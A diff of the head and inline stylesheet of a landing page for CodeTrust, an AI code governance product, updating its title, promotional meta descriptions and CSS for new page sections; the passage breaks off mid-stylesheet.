@@ -4,18 +4,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CodeTrust — Trust the code. Ship with proof.</title>
+    <title>CodeTrust &mdash; AI Governance Enforcement Platform</title>
     <meta name="description"
-        content="AI code governance and verification platform — 62 rules across 9 enforcement layers. Verifies dependencies, containers, and infrastructure against real registries. Prevents hallucinated packages, unsafe patterns, and CI/CD failures before production.">
+        content="AI governance enforcement platform &mdash; 132 rules across 10 enforcement layers, 17 MCP tools, 26 API endpoints. Prevents hallucinated packages, blocks destructive AI agent commands before execution, and tracks code safety over time.">
     <meta name="author" content="Said Borna">
     <meta name="robots" content="index, follow">
 
-    <meta property="og:title" content="CodeTrust — Trust the code. Ship with proof.">
-    <meta property="og:description" content="AI code verification. 9 layers. 845 tests. 62 rules. Zero tolerance.">
+    <meta property="og:title" content="CodeTrust &mdash; Prevent. Don't detect.">
+    <meta property="og:description"
+        content="AI governance enforcement. 10 layers. 1314 tests. 132 rules. Three moats no other tool has.">
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://codetrust.saidborna.com">
     <meta name="twitter:card" content="summary_large_image">
 
+    <link rel="icon" type="image/svg+xml" href="favicon.svg">
     <link rel="icon" type="image/png" sizes="32x32" href="favicon-32.png">
     <link rel="icon" type="image/png" sizes="16x16" href="favicon-16.png">
     <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
@@ -26,9 +28,6 @@
         rel="stylesheet">
 
     <style>
-        /* ═══════════════════════════════════════════════════════════
-           FOUNDATION
-           ═══════════════════════════════════════════════════════════ */
         :root {
             --black: #050507;
             --surface: #0c0c10;
@@ -49,6 +48,7 @@
             --amber: #f59e0b;
             --amber-dim: rgba(245, 158, 11, 0.12);
             --cyan: #06b6d4;
+            --cyan-dim: rgba(6, 182, 212, 0.12);
         }
 
         * {
@@ -79,9 +79,7 @@
             text-decoration: none;
         }
 
-        /* ═══════════════════════════════════════════════════════════
-           TOP BAR
-           ═══════════════════════════════════════════════════════════ */
+        /* TOP BAR */
         .topbar {
             position: fixed;
             top: 0;
@@ -100,18 +98,18 @@
         .topbar-logo {
             display: flex;
             align-items: center;
-            gap: 0.6rem;
+            gap: 0;
             font-weight: 700;
-            font-size: 1.05rem;
+            font-size: 1.35rem;
             letter-spacing: -0.02em;
         }
 
-        .topbar-logo svg {
-            flex-shrink: 0;
+        .topbar-logo .code {
+            color: var(--white);
         }
 
         .topbar-logo .trust {
-            color: var(--green);
+            color: #3b82f6;
         }
 
         .topbar-nav {
@@ -142,7 +140,6 @@
             border-radius: 6px;
             font-weight: 600 !important;
             font-size: 0.82rem;
-            transition: opacity 0.15s;
         }
 
         .topbar-install:hover {
@@ -158,9 +155,7 @@
             padding: 0.5rem;
         }
 
-        /* ═══════════════════════════════════════════════════════════
-           HERO
-           ═══════════════════════════════════════════════════════════ */
+        /* HERO */
         .hero {
             min-height: 100vh;
             display: flex;
@@ -170,8 +165,6 @@
             position: relative;
             overflow: hidden;
         }
-
-
 
         .hero::after {
             content: '';
@@ -208,23 +201,61 @@
         }
 
         .hero h1 {
-            font-size: clamp(2.8rem, 7vw, 5.5rem);
+            font-size: clamp(2.2rem, 5.5vw, 4rem);
             font-weight: 700;
-            line-height: 1.05;
-            letter-spacing: -0.035em;
+            line-height: 1.1;
+            letter-spacing: -0.03em;
             color: var(--white);
-            margin-bottom: 1.8rem;
+            margin-bottom: 1rem;
         }
 
-        .hero h1 em {
-            font-style: normal;
-            color: var(--indigo);
+        .hero h1 .line2 {
+            display: block;
+            color: #3b82f6;
+        }
+
+        .hero-strikes {
+            margin: 1.5rem auto 1rem;
+            text-align: center;
+        }
+
+        .strike-line {
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 1rem;
+            font-weight: 600;
+            letter-spacing: 0.04em;
+            background: linear-gradient(90deg, var(--red-dim), rgba(239, 68, 68, 0.18));
+            color: var(--red);
+            padding: 0.5rem 1.4rem;
+            border-radius: 6px;
+            border-left: 3px solid var(--red);
+            display: inline-block;
+        }
+
+        .hero-positive {
+            margin: 0 auto 2.5rem;
+            text-align: center;
+        }
+
+        .positive-line {
+            font-size: 1.15rem;
+            font-weight: 500;
+            background: var(--green-dim);
+            color: var(--green);
+            padding: 0.55rem 1.4rem;
+            border-radius: 6px;
+            border-left: 3px solid var(--green);
+            display: inline-block;
+        }
+
+        .positive-line strong {
+            color: var(--white);
         }
 
         .hero-text {
             font-size: 1.15rem;
             color: var(--text-2);
-            max-width: 560px;
+            max-width: 600px;
             margin: 0 auto 2.5rem;
             line-height: 1.7;
         }
@@ -299,14 +330,361 @@
             transition: opacity 0.2s;
         }
 
-        /* ═══════════════════════════════════════════════════════════
-           NARRATIVE — the problem
-           ═══════════════════════════════════════════════════════════ */
-        .narrative {
+        /* SECTION COMMON */
+        .section-tag {
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.72rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            color: var(--indigo);
+            margin-bottom: 1rem;
+        }
+
+        .section-center {
+            text-align: center;
+        }
+
+        .section-desc {
+            color: var(--text-2);
+            max-width: 560px;
+            font-size: 1rem;
+            margin: 0 auto 3rem;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
             padding: 8rem clamp(1.5rem, 6vw, 6rem);
             border-top: 1px solid var(--border);
         }
 
+        .container h2 {
+            font-size: 2.4rem;
+            font-weight: 700;
+            letter-spacing: -0.03em;
+            color: var(--white);
+            margin-bottom: 0.8rem;
+            text-align: center;
+        }
+
+        /* THREE MOATS */
+        .moats-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1.5rem;
+            margin-top: 3rem;
+        }
+
+        .moat-card {
+            padding: 2rem;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            transition: border-color 0.2s;
+        }
+
+        .moat-card:hover {
+            border-color: var(--border-strong);
+        }
+
+        .moat-icon {
+            width: 44px;
+            height: 44px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1.2rem;
+            font-size: 1.3rem;
+        }
+
+        .moat-icon-gateway {
+            background: var(--red-dim);
+            color: var(--red);
+        }
+
+        .moat-icon-halluc {
+            background: var(--amber-dim);
+            color: var(--amber);
+        }
+
+        .moat-icon-drift {
+            background: var(--cyan-dim);
+            color: var(--cyan);
+        }
+
+        .moat-card h3 {
+            font-size: 1.05rem;
+            font-weight: 700;
+            color: var(--white);
+            margin-bottom: 0.5rem;
+        }
+
+        .moat-card p {
+            font-size: 0.88rem;
+            color: var(--text-2);
+            line-height: 1.65;
+        }
+
+        .moat-stat {
+            margin-top: 1.2rem;
+            padding-top: 1rem;
+            border-top: 1px solid var(--border);
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.75rem;
+        }
+
+        .moat-stat-num {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--white);
+        }
+
+        /* GATEWAY */
+        .gateway-container {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 3rem 2rem;
+            margin-top: 3rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .gateway-container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(239, 68, 68, 0.06) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .gateway-flow {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+            max-width: 700px;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .gateway-row {
+            display: grid;
+            grid-template-columns: 100px 30px 1fr 30px 130px;
+            align-items: center;
+            padding: 1rem 1.5rem;
+            background: var(--surface-2);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.85rem;
+            transition: all 0.3s ease;
+        }
+
+        .gateway-row:hover {
+            transform: translateX(4px);
+        }
+
+        .gateway-row.blocked {
+            border-left: 3px solid var(--red);
+        }
+
+        .gateway-row.blocked:hover {
+            box-shadow: -4px 0 20px rgba(239, 68, 68, 0.15);
+        }
+
+        .gateway-row.allowed {
+            border-left: 3px solid var(--green);
+        }
+
+        .gateway-row.allowed:hover {
+            box-shadow: -4px 0 20px rgba(16, 185, 129, 0.15);
+        }
+
+        .gateway-source {
+            color: var(--text-2);
+            font-weight: 500;
+            font-size: 0.78rem;
+        }
+
+        .gateway-arrow {
+            color: var(--text-3);
+            text-align: center;
+        }
+
+        .gateway-cmd {
+            color: var(--white);
+            font-weight: 500;
+        }
+
+        .gateway-verdict-block {
+            color: var(--red);
+            font-weight: 700;
+            text-align: right;
+            letter-spacing: 0.05em;
+        }
+
+        .gateway-verdict-allow {
+            color: var(--green);
+            font-weight: 700;
+            text-align: right;
+            letter-spacing: 0.05em;
+        }
+
+        .gateway-story {
+            text-align: center;
+            margin-top: 2rem;
+            padding: 1.5rem 2rem;
+            background: var(--surface-3);
+            border-radius: 10px;
+            border: 1px solid var(--border);
+        }
+
+        .gateway-story p {
+            font-size: 0.92rem;
+            color: var(--text-2);
+            line-height: 1.75;
+        }
+
+        .gateway-story strong {
+            color: var(--white);
+        }
+
+        .gateway-audit {
+            text-align: center;
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.72rem;
+            color: var(--text-3);
+            margin-top: 1.2rem;
+        }
+
+        /* TRUST SCORE */
+        .score-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 3rem;
+            margin-top: 3rem;
+            align-items: center;
+        }
+
+        .score-visual {
+            background: linear-gradient(135deg, var(--surface) 0%, var(--surface-2) 100%);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 2.5rem;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+
+        .score-circle {
+            width: 180px;
+            height: 180px;
+            border-radius: 50%;
+            border: 6px solid var(--green);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+            box-shadow: 0 0 40px rgba(16, 185, 129, 0.25), 0 0 80px rgba(16, 185, 129, 0.08);
+            animation: scoreGlow 3s ease-in-out infinite alternate;
+        }
+
+        .score-num {
+            font-size: 3rem;
+            font-weight: 700;
+            color: var(--white);
+            line-height: 1;
+        }
+
+        .score-grade {
+            font-size: 0.82rem;
+            color: var(--green);
+            font-weight: 600;
+            margin-top: 0.2rem;
+        }
+
+        .score-meta {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 1rem;
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.72rem;
+        }
+
+        .score-meta-item {
+            text-align: center;
+        }
+
+        .score-meta-val {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--white);
+        }
+
+        .score-meta-label {
+            color: var(--text-3);
+            margin-top: 0.2rem;
+        }
+
+        .score-trend {
+            margin-top: 1rem;
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.78rem;
+            color: var(--green);
+            font-weight: 500;
+        }
+
+        .score-text h2 {
+            text-align: left;
+            margin-bottom: 1.2rem;
+        }
+
+        .score-text p {
+            font-size: 1.05rem;
+            color: var(--text-2);
+            line-height: 1.75;
+            margin-bottom: 1rem;
+        }
+
+        .gradient-green {
+            background: linear-gradient(135deg, var(--white) 30%, var(--green) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .score-features {
+            list-style: none;
+            padding: 0;
+            margin-top: 1.5rem;
+        }
+
+        .score-features li {
+            padding: 0.5rem 0;
+            font-size: 0.9rem;
+            color: var(--text-2);
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+        }
+
+        .score-features li::before {
+            content: '';
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--cyan);
+            flex-shrink: 0;
+        }
+
+        /* PROBLEM */
         .narrative-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -319,25 +697,6 @@
             position: sticky;
             top: 7rem;
             align-self: start;
-        }
-
-        .section-tag {
-            font-family: 'IBM Plex Mono', monospace;
-            font-size: 0.72rem;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.12em;
-            color: var(--indigo);
-            margin-bottom: 1rem;
-        }
-
-        .narrative h2 {
-            font-size: 2.4rem;
-            font-weight: 700;
-            letter-spacing: -0.03em;
-            line-height: 1.15;
-            color: var(--white);
-            margin-bottom: 1.2rem;
         }
 
         .narrative-lead {
@@ -384,6 +743,11 @@
             color: var(--amber);
         }
 
+        .label-prevent {
+            background: var(--green-dim);
+            color: var(--green);
+        }
+
         .problem-item h4 {
             font-size: 0.95rem;
             font-weight: 600;
@@ -397,37 +761,7 @@
             line-height: 1.6;
         }
 
-        /* ═══════════════════════════════════════════════════════════
-           TERMINAL
-           ═══════════════════════════════════════════════════════════ */
-        .terminal-section {
-            padding: 6rem clamp(1.5rem, 6vw, 6rem);
-            border-top: 1px solid var(--border);
-            max-width: 1100px;
-            margin: 0 auto;
-        }
-
-        .terminal-section h2 {
-            font-size: 2.4rem;
-            font-weight: 700;
-            letter-spacing: -0.03em;
-            color: var(--white);
-            margin-bottom: 0.8rem;
-            text-align: center;
-        }
-
-        .terminal-section .section-tag,
-        .terminal-section .section-desc {
-            text-align: center;
-        }
-
-        .terminal-section .section-desc {
-            color: var(--text-2);
-            max-width: 520px;
-            margin: 0 auto 2.5rem;
-            font-size: 1rem;
-        }
-
+        /* TERMINAL */
         .terminal {
             max-width: 820px;
             margin: 0 auto;
@@ -500,10 +834,6 @@
             font-weight: 600;
         }
 
-        .t-info {
-            color: #818cf8;
-        }
-
         .t-pass {
             color: var(--green);
             font-weight: 600;
@@ -515,37 +845,7 @@
             border-top: 1px solid var(--border);
         }
 
-        /* ═══════════════════════════════════════════════════════════
-           PIPELINE — 9 layers
-           ═══════════════════════════════════════════════════════════ */
-        .pipeline {
-            padding: 8rem clamp(1.5rem, 6vw, 6rem);
-            border-top: 1px solid var(--border);
-            max-width: 1100px;
-            margin: 0 auto;
-        }
-
-        .pipeline h2 {
-            font-size: 2.4rem;
-            font-weight: 700;
-            letter-spacing: -0.03em;
-            color: var(--white);
-            margin-bottom: 0.8rem;
-            text-align: center;
-        }
-
-        .pipeline .section-tag,
-        .pipeline .section-desc {
-            text-align: center;
-        }
-
-        .pipeline .section-desc {
-            color: var(--text-2);
-            max-width: 520px;
-            font-size: 1rem;
-            margin: 0 auto 3rem;
-        }
-
+        /* PIPELINE */
         .pipe-track {
             display: flex;
             flex-direction: column;
@@ -562,7 +862,7 @@
             top: 40px;
             bottom: 40px;
             width: 1px;
-            background: linear-gradient(to bottom, var(--indigo) 0%, var(--green) 100%);
+            background: linear-gradient(to bottom, var(--indigo) 0%, var(--green) 50%, var(--red) 100%);
             opacity: 0.3;
         }
 
@@ -570,7 +870,7 @@
             display: flex;
             align-items: flex-start;
             gap: 1.2rem;
-            padding: 1.1rem 0;
+            padding: 0.9rem 0;
             position: relative;
         }
 
@@ -589,6 +889,11 @@
             font-weight: 600;
             color: var(--indigo);
             z-index: 1;
+        }
+
+        .pipe-num-red {
+            color: var(--red);
+            border-color: var(--red-dim);
         }
 
         .pipe-content h4 {
@@ -610,37 +915,27 @@
             margin-top: 0.3rem;
         }
 
-        /* ═══════════════════════════════════════════════════════════
-           RULES
-           ═══════════════════════════════════════════════════════════ */
-        .rules-section {
-            padding: 6rem clamp(1.5rem, 6vw, 6rem);
-            border-top: 1px solid var(--border);
-            max-width: 1100px;
-            margin: 0 auto;
+        .pipe-type {
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.62rem;
+            font-weight: 600;
+            padding: 0.12rem 0.4rem;
+            border-radius: 3px;
+            margin-left: 0.5rem;
+            vertical-align: middle;
         }
 
-        .rules-section h2 {
-            font-size: 2.4rem;
-            font-weight: 700;
-            letter-spacing: -0.03em;
-            color: var(--white);
-            margin-bottom: 0.8rem;
-            text-align: center;
+        .pipe-type-block {
+            background: var(--red-dim);
+            color: var(--red);
         }
 
-        .rules-section .section-tag,
-        .rules-section .section-desc {
-            text-align: center;
+        .pipe-type-advisory {
+            background: var(--indigo-dim);
+            color: #818cf8;
         }
 
-        .rules-section .section-desc {
-            color: var(--text-2);
-            max-width: 520px;
-            font-size: 1rem;
-            margin: 0 auto 2.5rem;
-        }
-
+        /* RULES */
         .rule-tabs {
             display: flex;
             gap: 0.25rem;
@@ -735,30 +1030,7 @@
             color: #818cf8;
         }
 
-        /* ═══════════════════════════════════════════════════════════
-           LANGUAGES
-           ═══════════════════════════════════════════════════════════ */
-        .langs {
-            padding: 4rem clamp(1.5rem, 6vw, 6rem);
-            border-top: 1px solid var(--border);
-            max-width: 1100px;
-            margin: 0 auto;
-        }
-
-        .langs-inner {
-            max-width: 820px;
-            margin: 0 auto;
-            text-align: center;
-        }
-
-        .langs h2 {
-            font-size: 2.4rem;
-            font-weight: 700;
-            letter-spacing: -0.03em;
-            color: var(--white);
-            margin-bottom: 2rem;
-        }
-
+        /* LANGUAGES */
         .lang-row {
             display: flex;
             gap: 0.5rem;
@@ -783,52 +1055,17 @@
             border-color: var(--border-strong);
         }
 
-        .lang-new {
-            font-size: 0.6rem;
-            font-weight: 700;
-            background: var(--indigo);
-            color: var(--white);
-            padding: 0.1rem 0.35rem;
-            border-radius: 3px;
-            margin-left: 0.4rem;
-            vertical-align: middle;
-            text-transform: uppercase;
-            letter-spacing: 0.04em;
-        }
-
-        /* ═══════════════════════════════════════════════════════════
-           INSTALL
-           ═══════════════════════════════════════════════════════════ */
-        .install {
-            padding: 6rem clamp(1.5rem, 6vw, 6rem);
-            border-top: 1px solid var(--border);
+        /* INSTALL */
+        .install-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 1rem;
             max-width: 1100px;
             margin: 0 auto;
         }
 
-        .install .section-tag {
-            text-align: center;
-        }
-
-        .install h2 {
-            font-size: 2.4rem;
-            font-weight: 700;
-            letter-spacing: -0.03em;
-            color: var(--white);
-            margin-bottom: 2.5rem;
-            text-align: center;
-        }
-
-        .install-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 1rem;
-            max-width: 900px;
-            margin: 0 auto;
-        }
-
         .install-card {
-            padding: 1.8rem;
+            padding: 1.4rem;
             background: var(--surface);
             border: 1px solid var(--border);
             border-radius: 10px;
@@ -840,26 +1077,27 @@
         }
 
         .install-card h4 {
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             font-weight: 600;
             color: var(--white);
-            margin-bottom: 0.4rem;
+            margin-bottom: 0.3rem;
         }
 
         .install-card p {
-            font-size: 0.82rem;
+            font-size: 0.78rem;
             color: var(--text-2);
-            margin-bottom: 1rem;
+            margin-bottom: 0.8rem;
         }
 
         .install-card code {
             font-family: 'IBM Plex Mono', monospace;
-            font-size: 0.8rem;
+            font-size: 0.75rem;
             color: var(--green);
             background: var(--green-dim);
             padding: 0.5rem 0.8rem;
             border-radius: 5px;
             display: block;
+            word-break: break-all;
         }
 
         .install-card a.card-link {
@@ -875,36 +1113,307 @@
             opacity: 0.75;
         }
 
-        /* ═══════════════════════════════════════════════════════════
-           BOTTOM CTA
-           ═══════════════════════════════════════════════════════════ */
-        .bottom-cta {
-            padding: 10rem clamp(1.5rem, 6vw, 6rem) 6rem;
+        /* STATS BAR */
+        .stats-bar {
+            display: flex;
+            justify-content: center;
+            gap: 3rem;
+            padding: 3rem 1rem;
             border-top: 1px solid var(--border);
-            max-width: 820px;
-            margin: 0 auto;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .stat-item {
             text-align: center;
         }
 
-        .bottom-cta h2 {
-            font-size: clamp(2rem, 5vw, 3.2rem);
+        .stat-num {
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 2rem;
             font-weight: 700;
-            letter-spacing: -0.03em;
             color: var(--white);
+        }
+
+        .stat-label {
+            font-size: 0.78rem;
+            color: var(--text-3);
+            margin-top: 0.3rem;
+        }
+
+        /* USAGE METRICS */
+        .usage-bar {
+            display: flex;
+            justify-content: center;
+            gap: 3.5rem;
+            padding: 3rem 1rem;
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .usage-item {
+            text-align: center;
+        }
+
+        .usage-num {
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: var(--green);
+            line-height: 1;
+        }
+
+        .usage-label {
+            font-size: 0.78rem;
+            color: var(--text-2);
+            margin-top: 0.5rem;
+        }
+
+        /* ARCHITECTURE */
+        .arch-flow {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0;
+            margin-top: 2.5rem;
+            flex-wrap: wrap;
+        }
+
+        .arch-node {
+            padding: 0.9rem 1.6rem;
+            border-radius: 10px;
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.85rem;
+            font-weight: 600;
+            text-align: center;
+            white-space: nowrap;
+            border: 1px solid var(--border);
+            background: var(--surface);
+            color: var(--text-2);
+            transition: all 0.2s;
+            position: relative;
+        }
+
+        .arch-node:hover {
+            border-color: var(--border-strong);
+            color: var(--white);
+        }
+
+        .arch-node .arch-icon {
+            display: block;
+            font-size: 1.6rem;
+            margin-bottom: 0.35rem;
+            line-height: 1;
+        }
+
+        .arch-node-ct {
+            background: linear-gradient(135deg, var(--indigo-dim), rgba(99, 102, 241, 0.2));
+            border-color: rgba(99, 102, 241, 0.3);
+            color: var(--white);
+            box-shadow: 0 0 30px rgba(99, 102, 241, 0.12);
+            padding: 1rem 2rem;
+            font-size: 0.95rem;
+        }
+
+        .arch-node-ct .arch-icon {
+            font-size: 2rem;
+        }
+
+        .arch-node-safe {
+            border-color: rgba(34, 197, 94, 0.25);
+            color: var(--green);
+        }
+
+        .arch-arrow {
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 1.1rem;
+            color: var(--text-3);
+            padding: 0 0.8rem;
+            flex-shrink: 0;
+        }
+
+        .arch-arrow-block {
+            color: var(--red);
+            position: relative;
+        }
+
+        .arch-arrow-block::after {
+            content: 'intercepts';
+            position: absolute;
+            bottom: -1.2rem;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 0.55rem;
+            color: var(--red);
+            letter-spacing: 0.04em;
+            text-transform: uppercase;
+            white-space: nowrap;
+        }
+
+        .arch-arrow-pass::after {
+            content: 'verified';
+            position: absolute;
+            bottom: -1.2rem;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 0.55rem;
+            color: var(--green);
+            letter-spacing: 0.04em;
+            text-transform: uppercase;
+            white-space: nowrap;
+        }
+
+        .arch-arrow-pass {
+            color: var(--green);
+            position: relative;
+        }
+
+        /* WORKS WITH */
+        .works-with {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 2.5rem;
+            padding: 2rem 1rem 0.8rem;
+            flex-wrap: wrap;
+        }
+
+        .works-with-label {
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.7rem;
+            color: var(--text-3);
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+        }
+
+        .works-with-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.85rem;
+            color: var(--text-2);
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .works-with-item:hover {
+            color: var(--white);
+        }
+
+        .works-with-item svg {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+        }
+
+        .telemetry-note {
+            text-align: center;
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.65rem;
+            color: var(--text-3);
+            padding: 0.6rem 1rem 1.5rem;
+            letter-spacing: 0.02em;
+        }
+
+        /* TREND GRAPH */
+        .trend-graph {
+            margin-top: 1.5rem;
+            padding: 1rem 1.2rem;
+            background: var(--surface-2);
+            border-radius: 8px;
+            border: 1px solid var(--border);
+        }
+
+        .trend-label {
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.68rem;
+            color: var(--text-3);
+            margin-bottom: 0.6rem;
+        }
+
+        .trend-bars {
+            display: flex;
+            align-items: flex-end;
+            gap: 3px;
+            height: 64px;
+        }
+
+        .trend-bar {
+            flex: 1;
+            border-radius: 2px 2px 0 0;
+            min-width: 4px;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .trend-bar:hover {
+            opacity: 0.8;
+        }
+
+        .trend-bar-good {
+            background: var(--green);
+        }
+
+        .trend-bar-ok {
+            background: var(--amber);
+        }
+
+        .trend-bar-bad {
+            background: var(--red);
+        }
+
+        .trend-axis {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 0.3rem;
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.6rem;
+            color: var(--text-3);
+        }
+
+        /* BOTTOM CTA */
+        .bottom-cta {
+            padding: 10rem clamp(1.5rem, 6vw, 6rem) 6rem;
+            border-top: 1px solid var(--border);
+            max-width: 900px;
+            margin: 0 auto;
+            text-align: center;
+            position: relative;
+        }
+
+        .bottom-cta::before {
+            content: '';
+            position: absolute;
+            bottom: 30%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 800px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(16, 185, 129, 0.06) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .bottom-cta h2 {
+            font-size: clamp(2.4rem, 5.5vw, 3.8rem);
+            font-weight: 700;
+            letter-spacing: -0.035em;
             line-height: 1.15;
             margin-bottom: 1.5rem;
+            position: relative;
+            background: linear-gradient(135deg, var(--white) 40%, var(--green) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
 
         .bottom-cta p {
             color: var(--text-2);
             font-size: 1.05rem;
-            max-width: 480px;
+            max-width: 560px;
             margin: 0 auto 2rem;
+            position: relative;
         }
 
-        /* ═══════════════════════════════════════════════════════════
-           FOOTER
-           ═══════════════════════════════════════════════════════════ */
+        /* FOOTER */
         footer {
             padding: 2.5rem clamp(1.5rem, 6vw, 6rem);
             border-top: 1px solid var(--border);
@@ -929,9 +1438,74 @@
             color: var(--text-2);
         }
 
-        /* ═══════════════════════════════════════════════════════════
-           SCROLL REVEAL
-           ═══════════════════════════════════════════════════════════ */
+        /* MOAT HIGHLIGHT */
+        .moat-highlight {
+            text-align: center;
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--white);
+            margin: -0.5rem auto 3rem;
+            padding: 1.2rem 2rem;
+            max-width: 620px;
+            background: linear-gradient(135deg, var(--indigo-dim), rgba(99, 102, 241, 0.18));
+            border: 1px solid rgba(99, 102, 241, 0.25);
+            border-radius: 10px;
+            text-shadow: 0 0 30px rgba(99, 102, 241, 0.15);
+            animation: moatPulse 3s ease-in-out infinite alternate;
+        }
+
+        @keyframes moatPulse {
+            0% {
+                box-shadow: 0 0 20px rgba(99, 102, 241, 0.05);
+            }
+
+            100% {
+                box-shadow: 0 0 40px rgba(99, 102, 241, 0.18), 0 4px 20px rgba(99, 102, 241, 0.08);
+            }
+        }
+
+        @keyframes scoreGlow {
+            0% {
+                box-shadow: 0 0 30px rgba(16, 185, 129, 0.15);
+            }
+
+            100% {
+                box-shadow: 0 0 60px rgba(16, 185, 129, 0.35), 0 0 100px rgba(16, 185, 129, 0.1);
+            }
+        }
+
+        /* HERO LOGO */
+        .hero-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1.2rem;
+            margin: 0 auto 2.5rem;
+            filter: drop-shadow(0 0 40px rgba(59, 130, 246, 0.25)) drop-shadow(0 0 80px rgba(16, 185, 129, 0.12));
+        }
+
+        .hero-logo svg {
+            width: clamp(96px, 15vw, 132px);
+            height: auto;
+            flex-shrink: 0;
+        }
+
+        .hero-logo-text {
+            font-size: clamp(2.8rem, 7vw, 4.5rem);
+            font-weight: 700;
+            letter-spacing: -0.03em;
+            line-height: 1;
+        }
+
+        .hero-logo-text .code {
+            color: var(--white);
+        }
+
+        .hero-logo-text .trust {
+            color: #3b82f6;
+        }
+
+        /* SCROLL REVEAL */
         .reveal {
             opacity: 0;
             transform: translateY(24px);
@@ -943,11 +1517,12 @@
             transform: none;
         }
 
-        /* ═══════════════════════════════════════════════════════════
-           RESPONSIVE
-           ═══════════════════════════════════════════════════════════ */
+        /* RESPONSIVE */
         @media (max-width: 850px) {
-            .narrative-grid {
+
+            .narrative-grid,
+            .score-grid,
+            .moats-grid {
                 grid-template-columns: 1fr;
                 gap: 2rem;
             }
@@ -956,12 +1531,31 @@
                 position: static;
             }
 
-            .install-grid {
-                grid-template-columns: 1fr;
-            }
-
             .pipe-track::before {
                 display: none;
+            }
+
+            .stats-bar {
+                flex-wrap: wrap;
+                gap: 2rem;
+            }
+
+            .usage-bar {
+                flex-wrap: wrap;
+                gap: 2rem;
+            }
+
+            .install-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .arch-flow {
+                gap: 0.3rem;
+            }
+
+            .gateway-row {
+                grid-template-columns: 80px 20px 1fr 20px 100px;
+                font-size: 0.78rem;
             }
         }
 
@@ -996,10 +1590,58 @@
                 grid-template-columns: 1fr;
             }
 
+            .arch-flow {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .arch-arrow {
+                transform: rotate(90deg);
+                padding: 0.3rem 0;
+            }
+
+            .works-with {
+                gap: 1.2rem;
+                padding: 1.5rem 0.5rem 0.5rem;
+            }
+
+            .works-with-item {
+                font-size: 0.75rem;
+            }
+
+            .usage-bar {
+                gap: 1.5rem;
+                padding: 2rem 1rem;
+            }
+
+            .install-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .gateway-row {
+                grid-template-columns: 1fr;
